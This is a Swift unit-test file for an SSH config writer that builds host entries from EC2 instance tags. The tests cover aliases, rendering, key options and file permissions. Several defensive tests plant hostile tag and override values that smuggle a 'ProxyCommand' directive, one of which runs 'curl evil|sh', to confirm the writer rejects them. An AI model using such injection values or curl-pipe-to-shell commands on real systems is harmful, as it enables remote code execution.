import XCTest
@testable import HangarCore

final class SSHConfigWriterTests: TemporaryDirectoryTestCase {

    private let asgA = Fixture.instance(
        ["env": "prod", "Name": "xfer", "product": "payments",
         "hostname": "i-aaa.xfer.prod.example.com",
         "aws:autoscaling:groupName": "x-prod"], id: "i-0aaaaaaaaaaaaaaaa")
    private let asgB = Fixture.instance(
        ["env": "prod", "Name": "xfer", "product": "payments",
         "hostname": "i-bbb.xfer.prod.example.com",
         "aws:autoscaling:groupName": "x-prod"], id: "i-0bbbbbbbbbbbbbbbb",
        launchTime: "2026-08-21T10:00:00.000Z")
    private let solo = Fixture.instance(
        ["env": "qa", "Name": "web", "product": "payments",
         "hostname": "web.qa.example.com"], id: "i-0ccccccccccccccc1")

    private var writer: SSHConfigWriter { SSHConfigWriter(config: .standard()) }

    // MARK: - Aliases

    func testNumbersOnlyCollidingAliases() {
        let aliases = writer.entries(for: [asgB, asgA, solo]).map { $0.aliases[0] }
        XCTAssertTrue(aliases.contains("payments-prod-xfer-1"))
        XCTAssertTrue(aliases.contains("payments-prod-xfer-2"))
        XCTAssertTrue(aliases.contains("payments-qa-web"), "a lone host keeps a bare alias")
    }

    func testNumbersByLaunchTimeOldestFirst() {
        let entries = writer.entries(for: [asgB, asgA, solo])
        XCTAssertEqual(entries.first { $0.aliases[0] == "payments-prod-xfer-1" }?.instance.id,
                       asgA.id)
    }

    func testEveryEntryAlsoAnswersToItsIdAndFQDN() {
        for entry in writer.entries(for: [asgA, asgB, solo]) {
            XCTAssertTrue(entry.aliases.contains { $0.hasSuffix(entry.instance.id.prefix(10)) })
            XCTAssertTrue(entry.aliases.contains(entry.instance.host ?? ""))
        }
    }

    // MARK: - Rendering

    func testDefaultRendering() {
        let text = writer.render(instances: [asgA, asgB, solo], region: "us-west-2")
        XCTAssertTrue(text.contains("User \(NSUserName())"))
        XCTAssertFalse(text.contains("IdentityFile"), "no key is pinned by default")
        XCTAssertFalse(text.contains("IdentitiesOnly"), "so agent keys are not shut out")
        XCTAssertTrue(text.contains("UserKnownHostsFile ~/.ssh/known_hosts.ec2"))
        XCTAssertTrue(text.contains("# hangar product=payments env=prod"))
        XCTAssertTrue(text.contains("HostName i-aaa.xfer.prod.example.com"))
    }

    func testOverridesApplyOnlyWhereTheyMatch() {
        var config = HangarConfig.standard()
        config.overrides = [HangarConfig.Override(
            match: ["product": "payments", "env": "prod"], user: "rocky",
            identityFile: "~/payments_prod.pem", knownHostsFile: nil,
            strictHostKeyChecking: nil, extraOptions: ["ProxyJump": "bastion"])]
        let text = SSHConfigWriter(config: config)
            .render(instances: [asgA, solo], region: "us-west-2")
        XCTAssertTrue(text.contains("User rocky"))
        XCTAssertTrue(text.contains("IdentityFile ~/payments_prod.pem"))
        XCTAssertTrue(text.contains("IdentitiesOnly yes"), "a pinned key brings it")
        XCTAssertTrue(text.contains("ProxyJump bastion"))
        XCTAssertEqual(text.components(separatedBy: "User rocky").count - 1, 1,
                       "the override must not leak to the qa host")
    }

    // MARK: - Untrusted tag values

    func testASpaceInAHostnameTagDoesNotBreakTheFile() throws {
        // Regression: EC2 allows spaces in tag values, and an unquoted
        // `HostName web 1` made ssh reject the whole file, so a single sloppy
        // tag cost the user every alias they had.
        let spacey = Fixture.instance(["env": "qa", "Name": "web", "product": "payments",
                                       "hostname": "web 1.example.com"], id: "i-0space")
        let target = path("hangar")
        let result = try writer.sync(instances: [asgA, spacey], region: "us-west-2", to: target)

        XCTAssertNil(SSHConfigWriter.validate(target), "ssh must accept the file")
        XCTAssertEqual(result.hostCount, 2, "both hosts are still written")
        XCTAssertTrue(result.omittedHosts.isEmpty)
        let text = try String(contentsOfFile: target, encoding: .utf8)
        XCTAssertTrue(text.contains("HostName \"web 1.example.com\""), text)
    }

    func testANewlineInATagCannotInjectADirective() throws {
        let hostile = Fixture.instance(
            ["env": "prod", "Name": "web", "product": "payments",
             "hostname": "ok.example.com\n  ProxyCommand /bin/sh -c \"curl evil|sh\""],
            id: "i-0hostile")
        let target = path("hangar")
        let result = try writer.sync(instances: [asgA, hostile], region: "us-west-2", to: target)

        let text = try String(contentsOfFile: target, encoding: .utf8)
        XCTAssertFalse(text.contains("ProxyCommand"), "the directive must never be written")
        XCTAssertEqual(result.omittedHosts, ["i-0hostile"], "and the host is reported, not hidden")
        XCTAssertEqual(result.hostCount, 1, "the rest of the fleet is unaffected")
        XCTAssertNil(SSHConfigWriter.validate(target))
    }

    func testAnUnusableOverrideValueDropsOneOptionNotTheHost() {
        var config = HangarConfig.standard()
        config.overrides = [HangarConfig.Override(
            match: ["product": "payments"], user: "rocky\n  ProxyCommand evil",
            identityFile: nil, knownHostsFile: nil, strictHostKeyChecking: nil,
            extraOptions: nil)]
        let text = SSHConfigWriter(config: config)
            .render(instances: [asgA], region: "us-west-2")
        XCTAssertFalse(text.contains("ProxyCommand"))
        XCTAssertFalse(text.contains("User rocky"))
        XCTAssertTrue(text.contains("HostName i-aaa.xfer.prod.example.com"),
                      "the host itself survives a bad override")
    }

    func testAKeyPathContainingASpaceIsQuoted() {
        var config = HangarConfig.standard()
        config.overrides = [HangarConfig.Override(
            match: ["product": "payments"], user: nil,
            identityFile: "~/Cloud Keys/prod.pem", knownHostsFile: nil,
            strictHostKeyChecking: nil, extraOptions: nil)]
        let text = SSHConfigWriter(config: config)
            .render(instances: [asgA], region: "us-west-2")
        XCTAssertTrue(text.contains("IdentityFile \"~/Cloud Keys/prod.pem\""), text)
    }

    // MARK: - Writing

    func testSyncWritesA0600FileThatSSHAccepts() throws {
        let target = path("hangar")
        let result = try writer.sync(instances: [asgA, asgB, solo],
                                     region: "us-west-2", to: target)
        XCTAssertTrue(FileManager.default.fileExists(atPath: target))
        XCTAssertEqual(result.hostCount, 3)
        let mode = try FileManager.default
            .attributesOfItem(atPath: target)[.posixPermissions] as? NSNumber
        XCTAssertEqual(mode?.intValue, 0o600)
        XCTAssertNil(SSHConfigWriter.validate(target))
    }

    func testMalformedConfigIsRejectedByValidation() throws {
        let bad = path("broken")
        try "Host x\n  ThisIsNotAnOption yes\n".write(toFile: bad, atomically: true,
                                                      encoding: .utf8)
        XCTAssertNotNil(SSHConfigWriter.validate(bad))
    }

    // MARK: - Key sources

    /// The bug this exists to prevent: IdentitiesOnly used to follow IdentityFile
    /// automatically, and it tells ssh to ignore every key an agent is holding.
    /// A vault user who filled in the key field locked themselves out of every
    /// host at once, silently.
    func testIdentitiesOnlyCanBeSuppressedWithAKeyPinned() {
        var config = HangarConfig.standard()
        config.ssh?.identityFile = "~/.ssh/id_rsa"
        config.ssh?.identitiesOnly = false
        let text = SSHConfigWriter(config: config).render(instances: [solo], region: "us-west-2")
        XCTAssertTrue(text.contains("IdentityFile ~/.ssh/id_rsa"))
        XCTAssertFalse(text.contains("IdentitiesOnly"),
                       "an agent's keys must still be offered when the user says so")
    }

    func testPinningAKeyStillDefaultsToIdentitiesOnly() {
        var config = HangarConfig.standard()
        config.ssh?.identityFile = "~/.ssh/id_rsa"
        let text = SSHConfigWriter(config: config).render(instances: [solo], region: "us-west-2")
        XCTAssertTrue(text.contains("IdentitiesOnly yes"), "the shipped behaviour is kept")
    }

    func testAgentKeyEmitsAllThreeLines() {
        var config = HangarConfig.standard()
        config.ssh?.identityAgent = KeySource.onePasswordSocket
        config.ssh?.identityFile = "~/.hangar/keys/prod-sre-abcd1234.pub"
        config.ssh?.identitiesOnly = true
        let text = SSHConfigWriter(config: config).render(instances: [solo], region: "us-west-2")
        XCTAssertTrue(text.contains("IdentityAgent \"\(KeySource.onePasswordSocket)\""),
                      "the socket path has a space in it on every Mac")
        XCTAssertTrue(text.contains("IdentityFile ~/.hangar/keys/prod-sre-abcd1234.pub"))
        XCTAssertTrue(text.contains("IdentitiesOnly yes"))
    }

    /// Saying nothing is what lets an agent the user already configured globally
    /// keep working untouched. It is the default and it stays the default.
    func testNothingIsSaidAboutKeysByDefault() {
        let text = writer.render(instances: [solo], region: "us-west-2")
        XCTAssertFalse(text.contains("IdentityFile"))
        XCTAssertFalse(text.contains("IdentityAgent"))
        XCTAssertFalse(text.contains("IdentitiesOnly"))
    }

    func testAnAgentSocketCarryingADirectiveIsRefused() {
        var config = HangarConfig.standard()
        config.ssh?.identityAgent = "/tmp/x.sock\nProxyCommand evil"
        let text = SSHConfigWriter(config: config).render(instances: [solo], region: "us-west-2")
        XCTAssertFalse(text.contains("ProxyCommand"))
        XCTAssertFalse(text.contains("IdentityAgent"))
    }

    // MARK: - Sources

    func testAnImportedHostIsNotWrittenAndIsNotAnOmission() {
        let imported = Instance(
            id: "ssh:web1", state: "unknown", type: "", privateIP: nil, publicIP: nil,
            availabilityZone: nil, launchTime: "", tags: ["hostname": "10.0.0.1"],
            source: .sshConfig, preferredAlias: "web1")
        XCTAssertTrue(writer.entries(for: [imported]).isEmpty)
        XCTAssertTrue(writer.omitted(from: [imported]).isEmpty)
    }

    func testProvenanceIsInTheCommentOnlyWhenItIsNotEC2() {
        let csv = Instance(
            id: "csv:web1", state: "unknown", type: "", privateIP: nil, publicIP: nil,
            availabilityZone: nil, launchTime: "", tags: ["hostname": "10.0.0.1"],
            source: .hostsFile, preferredAlias: "web1")
        XCTAssertTrue(writer.render(instances: [csv], region: "us-west-2")
            .contains("source=hosts_file"))
        XCTAssertFalse(writer.render(instances: [solo], region: "us-west-2")
            .contains("source="), "printing it on every row of an EC2 fleet tells nobody anything")
    }
}
